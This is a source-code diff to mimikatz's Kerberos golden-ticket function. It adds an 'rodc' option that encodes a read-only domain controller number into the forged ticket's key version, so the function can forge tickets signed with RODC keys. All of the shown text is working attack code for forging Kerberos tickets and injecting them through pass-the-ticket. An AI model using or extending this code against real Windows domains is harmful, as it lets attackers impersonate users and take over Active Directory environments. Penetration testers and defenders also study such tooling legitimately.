@@ -314,8 +314,8 @@ GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAU
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
-	DWORD i, j, nbGroups, id = 500, keyType, /*keyLen,*/ App_KrbCredSize;
-	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szLifetime, base, filename;
+	DWORD i, j, nbGroups, id = 500, keyType, rodc = 0,/*keyLen,*/ App_KrbCredSize;
+	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szRodc, szLifetime, base, filename;
 	PISID pSid;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
@@ -350,6 +350,9 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 						
 						if(kull_m_string_args_byName(argc, argv, L"id", &szId, NULL))
 							id = wcstoul(szId, NULL, 0);
+
+						if(kull_m_string_args_byName(argc, argv, L"rodc", &szRodc, NULL))
+							rodc = wcstoul(szRodc, NULL, 0);
 
 						if(kull_m_string_args_byName(argc, argv, L"groups", &szGroups, NULL))
 						{
@@ -418,7 +421,7 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 
 								kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
 
-								if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups))
+								if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, rodc))
 								{
 									App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
 									if(isPtt)
@@ -488,7 +491,7 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups)
+PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, DWORD rodc)
 {
 	NTSTATUS status;
 	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
@@ -515,7 +518,8 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	ticket.TargetDomainName = ticket.AltTargetDomainName = ticket.DomainName;
 
 	ticket.TicketFlags = (servicename ? 0 : KERB_TICKET_FLAGS_initial) | KERB_TICKET_FLAGS_pre_authent | KERB_TICKET_FLAGS_renewable | KERB_TICKET_FLAGS_forwardable;
-	ticket.TicketKvno = 2; // windows does not care about it...
+	
+	ticket.TicketKvno = rodc ? (0x00000001 | (rodc << 16)) :  2; // windows does not care about it...
 	ticket.TicketEncType = ticket.KeyType = keyType;
 	ticket.Key.Length = keySize;
 	if(ticket.Key.Value = (PUCHAR) LocalAlloc(LPTR, ticket.Key.Length))
